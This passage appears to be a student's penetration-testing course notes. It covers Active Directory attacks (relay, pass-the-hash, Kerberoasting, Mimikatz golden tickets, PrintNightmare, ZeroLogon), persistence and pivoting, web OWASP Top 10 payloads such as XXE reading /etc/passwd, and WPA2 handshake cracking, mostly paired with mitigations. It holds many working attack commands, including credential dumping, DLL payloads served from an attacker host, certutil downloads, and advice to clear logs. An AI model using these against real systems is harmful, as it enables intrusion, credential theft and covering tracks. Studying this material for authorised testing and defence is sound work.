``` bash
psexec.py <domain/user:password@target ip>
# example: psexec.py mk.local/subzero:Password3@172.16.127.130
```

> We can try use **smbexec.py** or **wmiexec.py** with the same syntax

### IPv6 DNS Takeover via MITM6

``` bash
mitm6 -d mk.local
# -d <domain> 
```

``` bash
ntlmrelayx -6 -t ldaps://172.16.127.129 -wh fakewpad.mk.local -l lootme
# ip = DC
# -l = loot - to dump information
```

#### Mitigation

``` bash
- If you do not use IPv6 the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via GPO.
- If WPAD is not in use, disable via GPO and disable the WinHttpAutoProxySrc service
- Enable both LDAP signing and LDAP channel binding
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and can not be delegated, which will prevent any impersonation of that user via delegation.
```

### Attacking AD Strategies and Other vectors

Strategies:

``` bash
- Begin the day with 'mitm6' or 'Responder'
- Runs scans to generate traffic
- If scans are taking too long, look for websites in scope (http_version)
- Look for default credentials on web logins > printers, jenkins, etc
- Think outside the box
```

## PowerView CheatSheet

→ https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

### PowerView

``` powershell
Run PowerView:

powershell -ep bypass
# -ep = ExecutionPolicy
# . .\PowerView.ps1

Commands:
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
(Get-DomainPolicy)."system access"
Get-NetUser
Get-NetUser | select cn / samaccountname / description / etc
Get-UserProperty
Get-UserProperty -Properties pwdlastset / logonaccount / badpwdcount
Get-NetComputer
Get-NetComputer -FullData | select OperatingSystem
Get-NetGroup -GroupName *admin*
Get-NetGroupMember -GroupName "Domain Admins"
Invoke-ShareFinder
Get-NetGPO | select displayname, whenchanged
```

### BloodHound

    set neo4j
    open bloodhound
    Get a data collector to use Invoke-BloodHound
     →  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 
     → https://github.com/BloodHoundAD/SharpHound3

Pass the data collector to the Windows Machine:

``` powershell
powershell -ep bypass > . .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
Send the file: \Downloads\file.zip to Kali
```

Go to BloodHound in Kali:

``` bash
Upload Data > the zip file that we generate in the Windows Machine
Enumeration time!
```

## Post-Compromise Attacks

### Additional Resources

- https://adsecurity.org/
- http://blog.harmj0y.net/
- https://www.pentesteracademy.com/activedirectorylab

### Pass the Password & Pass the Hash

``` bash
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -H <hash> --local-auth
# obs: Regarding the SAM hash, we always gonna get the second portion to pass/crack etc
# --sam =try to dump the sam
```

> \[To remember\] You can pass around NTLM hashes, you can not pass NTLMv2 hashes

Pass with psexec:

``` bash
psexec.py <"user":@ip> -hashes <the whole hash>
```

Get hashes:

``` bash
secretsdump.py <domain/user:password@target ip>
```

#### Mitigation - Pass Attacks

``` bash
- Avoid re-using local admin password
- Limit who is a local administrator (least privilege)
- Utilize strong passwords
- Privileges Access Management (PAM)
- Automatically rotate passwords 
```

### Token Impersonation

Temporary Keys that allow you access to a system

2 types:

``` bash
Delegate: Created \for logging into a machine or RDP.
Impersonate: non-interactive such as attaching a network driver or a domain login script
```

In meterpreter:

``` bash
getuid
load incognito
list_tokens -u
impersonate_token <domain\\user>
shell
```

> We can use psexec.py in meterpreter to get the first access, then we can post-attack the token

rev2self = to comeback to the last access in meterpreter

#### Mitigation - Token Impersonation

    - Limit user/group token creation permissions
    - Account tiering
    - Local admin restriction

### Kerberoasting

**Overview**:

    - The user request the TGT from DC by sending his NTLM hash
    - The DC answer with the TGT with kerberoasting hash
    - When user wanna access any server, the user request the TGS from DC by sending the TGT
    - The DC answer with the TGS with the servers account hash

    Finally:
    The user can access the service by sending the TGS
    THe service will answer if thats valid or not

**Attack with impacket**:

``` bash
python GetUserSPNs.py <domain/user:password> -dc-ip <ip of DC> -request

# Get the TGS hash
# crack it: hashcat -m 13100 hash.txt rockyou.txt
```

#### Mitigation - Keberroasting

    - Strong passwords
    - Least privilege

### Group Policy Preferences (GPP) AKA MS14-025

To check if the vulnerabilty exists:

    msf > auxiliary/smb_enum_gpp

#### tips

in smb:

    prompt off
    recurse on
    mget *

    in Wserver2012< -Found Groups.xml
    Get the cpassword
    gpp-decrypt <cpassword>

### URL File Attacks

- name it with '@something.url'
- and place it in a share folder, or whatever place to people to click and redirect to our machine
- so we can grab with responder

``` bash
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\<kali ip>\%USERNAME%.icon
IconIndex=1

# Getting Hash
responder -I eth0 -v
```

> you dont even need to open the file, just go to the directory of the file and we have access from responder

### PrintNightmare (CVE-2021-1675)

    https://github.com/cube0x0/CVE-2021-1675
    https://github.com/calebstewart/CVE-2021-1675

To test if its vulnerable:

    run rpcdump.py @<dc ip> | egrep 'MS-RPRN|MSPAR'

- Install the last version of impacket
- grab the code and save in somethin.py

#### The Attack

**Step 1**:

    set mfvenom -o shell.dll

**Step 5**:

    set msfconsole

**Step 3**:

    smbserver.py share 'pwd' -smb2support

**Step 4**:

    Example:
    ./CVE-2021-1675.py hackit.local/domain_user:Pass123@<dc ip> '\\<kali ip>\share\shell.dll'
    ./CVE-2021-1675.py hackit.local/domain_user:Pass123@<dc ip>  'C:\shell.dll'

#### Mitigation

    - Disable Spooler service

### Mimikatz

    - Tools used to view and steal credentials, generate kerberos tickets and leverage attacks
    - dumps credentials stored in memory
    - just a few attacks:
    - credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket

→ https://github.com/gentilkiwi/mimikatz

Run in the DC:

    mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
    lsadump::sam /patch
    lsadump::lsa /patch = lsa (local security authority)
    # ntds.dit = contains all the credentials aswell

#### Golden ticket

    mimikatz.exe
    privilege::debug
    lsadump::lsa /inject /name:krbtgt

    # in the output:
    # grab the SID of the domain
    # grab the NTLM hash of the TGT account

    kerberos::golden /User:Administrator /domain:mk.local /sid:<SID> /krbtgt:<NTLM hash> /id:500 /ptt
    # ptt = pass the ticket

    misc::cmd = to get a shell

> after that we can **psexec.exe** and dominate all the DC network

### ZeroLogon (CVE-2020-1472)

→ https://github.com/dirkjanm/CVE-2020-1472

→ https://github.com/SecuraBV/CVE-2020-1472

#### Checker

``` bash
python3 zerologon_check.py <domain controller> <target ip>
```

If it shows -\> Success DC can be fully compromised by a ZeroLogon

> we can print and show to the client, without the need to execute the exploit.
> Cause sets the credentials of DC to NULL, so we need to restore after, not worth the risk

#### Attack

``` bash
python3 cve-2020-1472-exploit.py <domain controller> <target ip>
secretsdump.py -just-dc <domain/DC\$@IP>
```

#### Restore

``` bash
secretsdump.py administrator@<target ip> -hash <administrator full hash>
found the plain_password_hex > copy the hash that is in front
python3 restorepassword.py <domain/DC@DC> -target-ip <ip> -hexpass <paste the hash of plain_pwd_hex>
```

# Post Exploitation

## File Transfer Review

Certutil:

    certutil.exe -urlcache -f http://<ip>/file.txt output_file.txt

HTTP:

``` bash
python3 -m http.server
python -m SimpleHTTPServer
```

Browser:

    Navigate directly to file

FTP:

``` bash
python -m pyftpdlib 21 <kali ip>
ftp <kali ip>
```

Linux:

``` bash
wget http://<ip>:<port>/file
```

Metasploit:

    - Has download and upload features to transfer files

## Maintaining Access

### With Metasploit

Persistence Scripts:

``` bash
run persistence -h
exploit/windows/local/persistence
exploit/windows/local/registry_persistence
```

Scheduled Tasks:

``` bash
run scheduleme
run schtaskabuse
```

Add a User:

``` powershell
net user hacker password123 /add
```

### Pivoting

Lab setup:

    - Shutdown the w10 machines
    - go to virtual network editor em vmware
    - change settings > add network > set up a range like 10.10.10.0/24
    - edit virtual machine settings > add a network adapter > put the new network in the second adapter
    - in the 2nd w10 machine > just change the net adapter to the new network

> \[RECAP\] One machine will have dual net adapter

> The second one gonna stay just in the new network - 10.10.10.0

> Both w10 machines will ping each other, our kali should ping just one

#### Metasploit

``` bash
exploit/windows/smb/psexec # enter in the machine that has 2 net adapters
route print or ipconfig # to show the network config
arp -a # to show the established connections
run autoroute -s 10.10.10.0/24
run autoroute -p # to list all active routes
background

# we can search portscan > tcp or whatever
```

### Cleanup

Make the system/network as it was when you entered it:

    - remove executables, scripts and added files
    - remove malware, rootkits and added user accounts
    - set settings back to original configurations

> Make it look like you were never there
> clear logs, traces etc

# Web Application

To install GO and other useful tools:

    https://github.com/Dewalt-arch/pimpmykali 

## Web Application Enumeration

### Assetfinder

To install:

``` bash
# go get -u github.com/tomnomnom/assetfinder

assetfinder <domain>
assetfinder --subs-only <domain>
```

> This script will sort only the subdomains that contains our target

create run.sh:

``` bash

#!/bin/bash

url=$1

if [ ! -d "$url" ]; then
  mkdir $url
fi

if [ ! -d "$url/recon" ]; then
  mkdir $url/recon
fi

echo "[+] Harvesting subdomains with assetfinder..."
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt
```

### Amass

https://github.com/OWASP/Amass

``` bash
# go get -v github.com/OWASP/Amass/v3/...

amass enum -d <domain>
```

Add to the script:

``` bash
echo "[+] Harvesting subdomains with Amass..."
amass enum -d $url >> $url/recon/f.txt
sort -u $url/recon/f.txt >> $url/recon/final.txt
rm $url/recon/f.txt
```

### Httprobe

→ https://github.com/tomnomnom/httprobe

It tests the list to see which one is up:

``` bash
# go get -u github.com/tomnomnom/httprobe

cat <file of subdomains> | httprobe -s -p https:443
```

add to the script:

``` bash
echo "[+] Probing for alive domains..."
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\////' | tr -d ':443' >> $url/recon/alive.txt
```

### GoWitness

→ https://github.com/sensepost/gowitness

Takes screenshot of a webpage:

    # go get -u gorm.io/gorm = dependencies
    # go get -u github.com/sensepost/gowitness
    # gowitness single https://<domain>

    cd screenshots/

#### tcm full script for subdomain enumeration

    https://pastebin.com/MhE6zXVt

#### Additional Resources

    https://www.youtube.com/watch?v=uKWu6yhnhbQ
    https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA

## Testing OWASP Top 10

https://owasp.org/Top10/

- checklist: https://github.com/tanprathan/OWASP-Testing-Checklist

### Juice Shop

its a vulnerable website made by owasp:

    https://github.com/juice-shop/juice-shop
    https://pwning.owasp-juice.shop/

We can install locally with docker or just access the thm room:

    https://tryhackme.com/room/owaspjuiceshop

#### Install Foxy Proxy

    # extension in firefox to change proxy easyly
    https://addons.mozilla.org/pt-BR/firefox/addon/foxyproxy-standard/

#### BurpSuite

    proxy > options > intercept client/server requests > enable -- Is in targe scope

> Everything else its not new. so i will pass for now, cause i used burp a lot in ctfs.

### SQL Injection

Is an attack in which malicious SQL statements are injected into a SQL database

#### Overview

SQL Verbs:

    SELECT, INSERT, DELETE, UPDATE, DROP, UNION

Common Terms:

    WHERE, AND/OR/NOT, ORDER BY

Special Chars:

``` python
'  'and " " = string delimiters
--, /*, # = comment delimiters
*, % = wildcards
; = end sql statement
=, +,<,> = logic
```

#### Mitigation

    - Parameterized Statements:
    # Good example: "SELECT * FROM users WHERE email =?";
    # Bad example: "SELECT * FROM users WHERE email = '+email+'";

    - Sanitizing Input

### Broken Authentication

    Permits brute force or other automated attacks
    Permits default, weak or well-known passwords

- look for token session
- default credentials
- possibility to brute force

### Mitigation

    - Implement MFA
    - Do not ship or deploy any default credentials
    - Implement weak-password checks

### Sensitive Data Exposure

    clear text data
    without criptography

#### Mitigation

    - Make sure you data is encripted 
    - Dont share unnecessary data
    - Strong passords

#### Discover

    # To discover files that not should have been exposed first of all we need a good enumeration
    # Find directories with web crawling: gobuster, dirb, dirsearch, ffuf, etc
    # Dig in responses of the requests in burp
    # Scan headers with: https://securityheaders.com/

    nmap --script=ssl-enum-ciphers -p 443 <domain>

### XML External Entities

Attack systems that parse XML imput

example.xml

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo any >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <foo>&xxe;</foo>
```

#### Mitigation

    - Disable the external entities in XML files

### Broken Access Control

    User get access to somewhere they should not
    example: access an admin panel without the credentials

    - Bypass broken access in inspect element, delete hidden=""
    - Change type: password to type: text to show passwords in clear text

### Security Misconfiguration

    Default credentials
    Improperly configured permissions
    Unnecessary features, ports, services, pages, accounts, etc

#### Mitigation

    - Security Headers
    - ACLs
    - Do not have any unnecessary features, components, etc

### Cross-Site Scripting (XSS)

Reflected:

    after inserting something malicious, its gonna reflect back to us
    example <script> alert(0) </script>

Stored:

    The malicious code gets stored into the server

DOM:

    Document object model - javascript
    its client side like reflected xss.
    example: <iframe src="javascript:alert('xss')">

#### Mitigation

    - Encoding: '<' becomes &lt;  <script> becomes &lt;script>
    - Filtering: <script> becomes script
    - Validating: compare input against white list
    - Sanitization: combination of escaping, filtering and validation

### Insecure Deserialization

We can send malicious data serialized and the application will deserialize and execute

#### Mitigation

    - Monitoring deserialization
    - Enforcing strict type contraints during deserialization
    - Implement digital signatures 

### Using components with Known vulnerabilities

Using out-dated applications, unsupported or vulnerable

#### Mitigation

    - Update old applications, services, etc
    - Keep inventory of versions of both client-side and server-side components
    - Remove unused dependencies, unnecessary features, components, files and documentation

### Insufficient Logging and Monitoring

    Auditable events, such as logins, failed logins
    uncler logs
    unable to detect or alert for active attacks in real time or near real time

### Mitigation

    - Ensure all login, access control failures and server-side input validation
    - Ensure that logs are generated in a format that can be easily consumed
    - Establish effective monitoring and alerting suspicious activities 
    - Establish an incident responde and recovery plan

# Wireless Penetration Testing

## Assessment of wireless network

    WPA2 PSK (pre share key)
    WPA2 Enterprise

### Activities performed

    Evaluating strength of PSK
    Reviewing nearby networks
    Assessing guest networks
    Checking network access

### Tools

    Wireless card
    Router
    Laptop

### Process of attack - WPA2 PSK

    Place > Discover > Select > Perform > Capture > Attemp

    - Place wireless card into monitor mode
    - Discover information about network 
        channel / BSSID (mac address)

    - Select network and capture data
    - Perform deauth attack
    - Capture WPA handshake
    - Attemp to crack the handshake

## WPA_PS2_Exploit

Connect the wireless card:

    if you are using VM
      Player > removable devices > card > connect

``` bash
iwconfig # to show wireless connections
airmon-ng check kill # check and kill processes that will interfere in our scope
airnon-ng start wlan0 # start monitor mode
airodump-ng wlan0mon # to show possible targets in the area
```

    BSSID # mac address of the access point
    PWR # power level, lower the number close we are to the device

    airodump-ng -c <channel> --bssid <mac address of target> -w <file name> wlan0mon (our w_interface)

> now we wait for the WPA handshake, we can accelerate this proccess by deauth the users from their network

    aireplay-ng -0 (means deauth) 1 (number of times we are gonna run) -a <mac address of target> -c <station mac address> wlan0mon (our interface)

> sometimes its necessary to run a couple of times, against differents users

After getting the WPA handshake:

``` bash
ls capture*
    show the .cap file
```

### crack the handshake wpa:

``` bash
aircrack-ng -w <wordlist> -b <mac address of target> <the .cap file>
# we can try to crack with hashcat too
```

# Report

## Common Legal Documents

Sales:

    Mutual Non-Disclosure Agreement (NDA)
    Master Service Agreement (MSA)
    Statement of Work (SOW)
    Other: Sample Report, Recommendation Letters, etc

Before you Test:

    Rules of Engagement (ROE)

After you Test:

    Findings Report

## Pentest Report Writing

→ https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report

→ https://tcm-sec.com/wp-content/uploads/2021/10/TCMS-Demo-Corp-Security-Assessment-Findings-Report.pdf
